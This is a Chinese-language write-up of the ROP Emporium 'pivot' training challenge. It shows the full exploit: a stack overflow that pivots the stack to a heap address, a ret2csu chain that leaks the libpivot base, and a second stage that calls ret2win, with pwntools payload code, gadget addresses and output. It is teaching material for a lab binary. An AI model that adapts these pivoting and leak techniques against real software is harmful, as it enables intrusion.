# Speedrun：ROP Emporium `pivot`（栈迁移 + 两阶段 libpivot leak）

> 题型：**栈溢出空间不足 → 栈迁移到堆 → CSU 链 leak .so 基址 → 二次利用打 ret2win**
> 亮点：`read(0, rbp-0x20, 0x40)` 只给 0x40 字节（溢出仅 0x18 字节），
> 必须先用 `xchg rsp, rax` 把栈搬到程序自己打印出来的堆地址上
> 出处：ROP Emporium pivot（zip 内 `pivot` + `libpivot.so` + `flag.txt`）

---

## 0. 一句话结论

```text
64 位、No PIE、NX、无 canary、partial RELRO、not stripped
main: malloc(0x1000000) -> arg = heap + 0xFFFF00，printf("%p", arg)
pwnme:
  memset(rbp-0x20, 0, 0x20)
  printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", arg)
  read(0, arg, 0x100)          <-- 长链写到堆上（arg 已打印）
  read(0, rbp-0x20, 0x40)      <-- 栈溢出，只有 0x40 字节
  leave; ret

usefulGadgets:
  0x4009bb  pop rax; ret
  0x4009bd  xchg rsp, rax; ret      <-- 一步完成迁移
  0x4009c0  mov rax, [rax]; ret
  0x4009c4  add rax, rbp; ret

三步：
1) 栈溢出：'A'*0x28 + pop_rax + pivot_addr + xchg_rsp_rax
2) 堆链（248 字节）：CSU 调 [foothold@got] 触发懒绑定 -> CSU 调 puts(foothold@got)
   -> ret 回 main
3) 第二轮：pivot_addr2 = libpivot_base + 0xa81 (ret2win)，同样的迁移，堆链只放 ret2win
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/stack_pivot'
file pivot libpivot.so
readelf -hW pivot | grep Type                 # EXEC -> No PIE
readelf -lW pivot | grep GNU_STACK            # RW -> NX
readelf -dW pivot | grep -E 'NEEDED|RUNPATH'  # libpivot.so + RUNPATH=.
objdump -d -M intel pivot | sed -n '/<pwnme>:/,/^$/p'
objdump -d -M intel pivot | sed -n '/<usefulGadgets>:/,+8p'
readelf -sW libpivot.so | grep -E 'foothold|ret2win'
```

`libpivot.so` 里两个偏移（`nm` 可查）：

```text
foothold_function @ 0x96a   （只 puts 一行字符串）
ret2win           @ 0xa81   （fopen("flag.txt") 并打印）
两者相差 0x117
```

---

## 2. 栈迁移的三步（偏移必须精确）

```text
pwnme 的栈帧：buf = rbp-0x20
payload[0x00:0x20] = 'A'*32
payload[0x20:0x28] = saved rbp（随便）
payload[0x28:0x30] = pop rax; ret
payload[0x30:0x38] = pivot_addr        <- 程序打印的 heap+0xFFFF00
payload[0x38:0x40] = xchg rsp, rax; ret
```

`read` 上限正好 0x40，所以**多一个字节都放不下**，这就是为什么必须迁移。

迁移后 `rsp = pivot_addr + 8`（ret 已经弹掉第一个 qword），从堆上继续执行。

---

## 3. 阶段 1：CSU 链 leak libpivot

CSU 的两个片段（和典型 glibc 编译产物一致）：

```text
0x400a2a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x400a10: mov rdx, r15
          mov rsi, r14
          mov edi, r13d        <-- 只取低 32 位，参数地址必须 < 4G
          call [r12+rbx*8]     <-- 内存间接调用！
          add rbx, 1
          cmp rbp, rbx
          jne 0x400a10
0x400a26: add rsp, 8; pop rbx,rbp,r12,r13,r14,r15; ret
```

所以一个"调用块"是 15 个 qword：

```python
def csu_call(func_got, arg=0):
    return (p64(CSU_POP) + p64(0) + p64(1) + p64(func_got) + p64(arg)
            + p64(0) + p64(0) + p64(CSU_CALL) + p64(0) + p64(0)*6)
```

阶段 1 的两块 + 回 main，共 `15+15+1 = 31` qword = **248 字节**（`read` 上限 256）：

```python
chain  = csu_call(FOOTHOLD_GOT)              # 先解析，否则 GOT 里还是 PLT 桩
chain += csu_call(PUTS_GOT, FOOTHOLD_GOT)    # puts(foothold@got) 泄漏
chain += p64(MAIN)                           # 重来一轮
```

> **为什么必须先调一次 `foothold_function`**：默认懒绑定，程序本身从没调用过它，
> `0x601040` 里存的是 `0x400726`（PLT+6 的桩地址）。不先解析，leak 出来的是桩地址，
> 算出来的 libpivot 基址是错的。

leak 解析（`puts` 遇到 `\x00` 截断，libpivot 在高地址，通常只有 6 字节有效）：

```python
io.recvuntil(b"into libpivot\n")   # foothold_function 的打印
leak = u64(io.recvn(6).ljust(8, b"\x00"))   # 紧跟着是 puts 输出的 6 字节原始地址
libpivot = leak - 0x96a
ret2win  = libpivot + 0xa81
```

> **坑**：这 6 字节里可能正好有 `0x00`（`puts` 在此截断，只剩 2~5 字节）或 `0x0a`
> （`recvline()` 会截断）；所以既不能用 `recvline()`，也不能假设固定长度。
> 本仓库的做法是读到下一个 banner `pivot by ROP Emporium` 为止，
> 并检查 `libpivot & 0xFFF == 0`；不是页对齐就 `close()` 重开一局（ASLR 会变，最多 5 次）。

---

## 4. 阶段 2：迁移到 `ret2win`

```python
io.recvuntil(b"place to pivot: "); pivot2 = int(io.recvline().strip(), 16)
io.recvuntil(b"> "); io.send(p64(ret2win))      # 堆链只放一条返回地址
io.recvuntil(b"> "); io.send(b"A"*0x28 + p64(POP_RAX) + p64(pivot2) + p64(XCHG_RSP_RAX))
```

`xchg rsp, rax; ret` 之后 `ret` 从 `[pivot2]` 弹出 `ret2win` —— 干净利落。

实测输出：

```text
[+] foothold @ 0x7e310260096a -> libpivot @ 0x7e3102600000
[+] ret2win  @ 0x7e3102600a81
[+] pivot stack #2: 0x7e31011fdf10
Thank you!
__PWNED__{pivot_local_ok}
```

---

## 5. 坑点清单

1. **`call [r12+rbx*8]` 是内存间接调用**：一开始我把 `r12` 填成 `foothold_function@plt`
   （0x400720）→ 实际执行 `call [0x400720]`，把 PLT 的机器码当作地址 → 直接 SIGSEGV。
   **`r12` 必须是存放函数指针的内存地址（GOT 项），不是函数/PLT 地址。**
   现象：链里 foothold 的字符串一个都没打印，进程静默退出。
2. **必须先触发一次懒绑定**，否则 leak 到的是 PLT 桩。
3. **`mov edi, r13d` 只取低 32 位**：传 GOT 地址（0x601040）没问题；
   如果要传堆地址（0x7f…）就会被截断，这条链不能用来传堆指针参数。
4. **`read` 上限 0x100**：阶段 1 的链 248 字节，已经接近上限，加东西前先算长度。
5. **`puts` 泄漏会被 `\x00` 截断**：补 `ljust(8, b'\x00')`，不要直接 `u64(recvn(8))`。
6. 阶段 1 结束后**必须回 `main`**（0x400847），不是回 `pwnme`——`pwnme` 需要参数，
   而且 `main` 会重新 `malloc` 并重新打印新 pivot 地址。

---

## 6. 识别卡

```text
read 长度只有几十字节（不够放长 ROP）
+ 程序打印了一个堆/栈地址（"place to pivot" / %p）
+ 有 xchg rsp, rax / leave;ret / pop rsp 之类迁移 gadget
=> stack pivot：短链迁移 -> 长链在可控内存里执行
```

| 关键量 | 值 |
| --- | --- |
| saved RIP 偏移 | `0x28` |
| 迁移 gadget | `pop rax=0x4009bb`、`xchg rsp,rax=0x4009bd` |
| CSU | `pop=0x400a2a`、`call=0x400a10`、收尾 `add rsp,8; pop×6; ret` |
| libpivot 偏移 | `foothold=0x96a`、`ret2win=0xa81`（差 `0x117`） |
| 阶段 1 链长 | 248 / 256 字节 |

> 备选打法：`mov rax,[rax]` + `add rax, rbp` 可以把 `foothold + (ret2win-foothold)`
> 算出来（把 saved rbp 设成 `0x117`），但最后仍然需要一次"跳到 rax"的动作，
> 而 `xchg rsp, rax; ret` 会把 `ret2win` 的代码字节当返回地址 —— 不成立。
> 所以老老实实两阶段最省事。
